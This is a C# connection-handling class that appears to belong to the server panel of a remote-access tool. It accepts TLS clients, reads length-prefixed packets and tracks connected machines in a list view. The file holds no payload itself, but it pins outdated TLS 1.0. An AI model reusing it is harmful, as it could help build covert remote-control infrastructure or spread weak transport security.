﻿using System;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;
using Server.Handle_Packet;
using System.Security.Cryptography;
using System.Drawing;
using System.Diagnostics;
using System.Threading;
using Server.MessagePack;
using System.Text;
using System.Net.Security;
using System.Security.Authentication;
using System.Threading.Tasks;
using Server.Algorithm;
using Server.Helper;

namespace Server.Connection
{
    public class Clients
    {
        public Socket TcpClient { get; set; }
        public SslStream SslClient { get; set; }
        public ListViewItem LV { get; set; }
        public ListViewItem LV2 { get; set; }
        public string ID { get; set; }
        private byte[] ClientBuffer { get; set; }
        private int ClientBuffersize { get; set; }
        private bool ClientBufferRecevied { get; set; }
        private MemoryStream ClientMS { get; set; }
        public object SendSync { get; } = new object();
        public long BytesRecevied { get; set; }


        public Clients(Socket socket)
        {
            TcpClient = socket;
            SslClient = new SslStream(new NetworkStream(TcpClient, true), false);
            SslClient.BeginAuthenticateAsServer(Settings.ServerCertificate, false, SslProtocols.Tls, false, EndAuthenticate, null);
        }

        private void EndAuthenticate(IAsyncResult ar)
        {
            try
            {
                SslClient.EndAuthenticateAsServer(ar);
                ClientBuffer = new byte[4];
                ClientMS = new MemoryStream();
                SslClient.BeginRead(ClientBuffer, 0, ClientBuffer.Length, ReadClientData, null);
            }
            catch
            {
                //Settings.Blocked.Add(ClientSocket.RemoteEndPoint.ToString().Split(':')[0]);
                SslClient?.Dispose();
                TcpClient?.Dispose();
            }
        }

        public async void ReadClientData(IAsyncResult ar)
        {
            try
            {
                if (!TcpClient.Connected)
                {
                    Disconnected();
                    return;
                }
                else
                {
                    int Recevied = SslClient.EndRead(ar);
                    if (Recevied > 0)
                    {
                        await ClientMS.WriteAsync(ClientBuffer, 0, Recevied);
                        if (!ClientBufferRecevied)
                        {
                            if (ClientMS.Length == 4)
                            {
                                ClientBuffersize = BitConverter.ToInt32(ClientMS.ToArray(), 0);
                                ClientMS.Dispose();
                                ClientMS = new MemoryStream();
                                if (ClientBuffersize > 0)
                                {
                                    ClientBuffer = new byte[ClientBuffersize];
                                    Debug.WriteLine("/// Server Buffersize " + ClientBuffersize.ToString() + " Bytes  ///");
                                    ClientBufferRecevied = true;
                                }
                            }
                        }
                        else
                        {
                            Settings.Received += Recevied;
                            BytesRecevied += Recevied;
                            if (ClientMS.Length == ClientBuffersize)
                            {
                                ThreadPool.QueueUserWorkItem(Packet.Read, new object[] { ClientMS.ToArray(), this });
                                ClientBuffer = new byte[4];
                                ClientMS.Dispose();
                                ClientMS = new MemoryStream();
                                ClientBufferRecevied = false;
                            }
                        }
                        SslClient.BeginRead(ClientBuffer, 0, ClientBuffer.Length, ReadClientData, null);
                    }
                    else
                    {
                        Disconnected();
                        return;
                    }
                }
            }
            catch
            {
                Disconnected();
                return;
            }
        }

        public void Disconnected()
        {
            if (LV != null)
            {
                if (Program.form1.listView1.InvokeRequired)
                    Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
                    {
                        try
                        {

                            lock (Settings.Listview1Lock)
                                LV.Remove();

                            if (LV2 != null)
                            {
                                lock (Settings.Listview3Lock)
                                    LV2.Remove();
                            }

                        }
                        catch { }
                    }));

                lock (Settings.Online)
                    Settings.Online.Remove(this);
            }

            try
            {
                TcpClient.Shutdown(SocketShutdown.Both);
            }
            catch { }

            try
            {
                SslClient?.Close();
                TcpClient?.Close();
                SslClient?.Dispose();
                TcpClient?.Dispose();
                ClientMS?.Dispose();
            }
            catch { }
        }

        public void Send(object msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!TcpClient.Connected)
                    {
                        Disconnected();
                        return;
                    }

                    if ((byte[])msg == null) return;
                    byte[] buffer = (byte[])msg;
                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);

                    TcpClient.Poll(-1, SelectMode.SelectWrite);
                    SslClient.Write(buffersize, 0, buffersize.Length);
                    SslClient.Flush();
                    int chunkSize = 50 * 1024;
                    byte[] chunk = new byte[chunkSize];
                    using (MemoryStream buffereReader = new MemoryStream(buffer))
                    using (BinaryReader binaryReader = new BinaryReader(buffereReader))
                    {
                        int bytesToRead = (int)buffereReader.Length;
                        do
                        {
                            chunk = binaryReader.ReadBytes(chunkSize);
                            bytesToRead -= chunkSize;
                            SslClient.Write(chunk);
                            SslClient.Flush();
                            Settings.Sent += chunk.Length;
                        } while (bytesToRead > 0);
                    }
                    Debug.WriteLine("/// Server Sent " + buffer.Length.ToString() + " Bytes  ///");
                }
                catch
                {
                    Disconnected();
                    return;
                }
            }
        }

    }
}
